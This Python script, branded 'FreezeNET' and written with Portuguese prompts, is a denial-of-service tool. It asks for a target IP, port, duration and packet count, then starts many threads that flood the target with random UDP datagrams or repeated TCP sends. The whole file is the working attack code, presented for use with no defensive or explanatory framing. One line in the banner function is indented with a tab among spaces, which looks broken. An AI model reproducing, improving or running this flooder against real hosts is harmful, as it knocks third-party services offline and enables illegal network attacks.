import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name
from pyfiglet import figlet_format
from colorama import Fore, Back, Style, init
import subprocess

# Initialize Colorama
init(autoreset=True)

def print_banner():
    # Print banner with pyfiglet and colors
    os.system('clear' if name != 'nt' else 'cls')
	os.system("pyfiglet --color=CYAN =FreezeNET ")

def clear_screen():
    os.system('clear' if name != 'nt' else 'cls')

def print_attack_status(ip, port, protocol, ping):
    print(Fore.CYAN + f"[FN] Ataque enviado: {ip}:{port} - {protocol} | Ping: {ping}ms")

def get_ping(ip):
    try:
        output = subprocess.check_output(
            ['ping', '-c', '1', ip] if name != 'nt' else ['ping', '-n', '1', ip],
            stderr=subprocess.STDOUT,
            universal_newlines=True
        )
        time_ms = output.split('time=')[-1].split(' ms')[0]
        return time_ms
    except subprocess.CalledProcessError:
        return 'N/A'

def udp_flood(ip, port, duration, packets):
    data = random._urandom(1024)
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                addr = (ip, port)
                for _ in range(packets):
                    s.sendto(data, addr)
                ping = get_ping(ip)
                print_attack_status(ip, port, 'UDP', ping)
        except Exception as e:
            print(Fore.RED + f"[ERROR] {str(e)}")

def tcp_flood(ip, port, duration, packets):
    data = random._urandom(16)
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip, port))
                for _ in range(packets):
                    s.send(data)
                ping = get_ping(ip)
                print_attack_status(ip, port, 'TCP', ping)
        except Exception as e:
            print(Fore.RED + f"[ERROR] {str(e)}")

def main():
    print_banner()

    test = input(Fore.WHITE + "Deseja continuar? (y/n): ").strip().lower()
    if test == "n":
        sys.exit(0)

    ip = input(Fore.WHITE + "Endereço/Ip: ").strip()
    port = int(input(Fore.WHITE + "Port: ").strip())
    choice = input(Fore.WHITE + "Udp-Flood (y/n): ").strip().lower()
    duration = int(input(Fore.WHITE + "Tempo: ").strip())
    packets = int(input(Fore.WHITE + "Pacotes: ").strip())

    if choice == 'y':
        target_function = udp_flood
    else:
        target_function = tcp_flood

    threads = []
    for _ in range(packets):
        thread = threading.Thread(target=target_function, args=(ip, port, duration, packets))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def exit_gracefully(signum, frame):
    clear_screen()
    print(Fore.CYAN + "Saindo... Obrigado por usar o script.")
    sys.exit(0)

if __name__ == '__main__':
    signal.signal(signal.SIGINT, exit_gracefully)
    main()
